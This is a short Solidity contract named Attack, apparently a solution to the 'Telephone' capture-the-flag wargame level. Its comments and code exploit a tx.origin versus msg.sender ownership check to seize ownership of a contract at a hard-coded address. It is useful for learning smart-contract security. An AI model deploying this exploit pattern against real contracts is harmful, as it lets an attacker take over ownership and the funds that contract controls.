//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attack{

//the purpose of this contract is to be injected between the target contract and the externally owned account that initiated the txn
//this way the differentiation between tx.origin (the EOA address) and msg.sender (this contract) is made
//the if statement in the changeOwner() fct from the target contact will return true and the owner will be changed 

    Telephone tel;
    address instance= 0xdcb813caB1c0d2fCC27a32b29D691DF4E8037A0B;

    constructor(){
        tel = Telephone(instance);
    }

    function gxt(address o) public {
        tel.changeOwner(o);
        //calling the function from here instead of the player address
    }
}
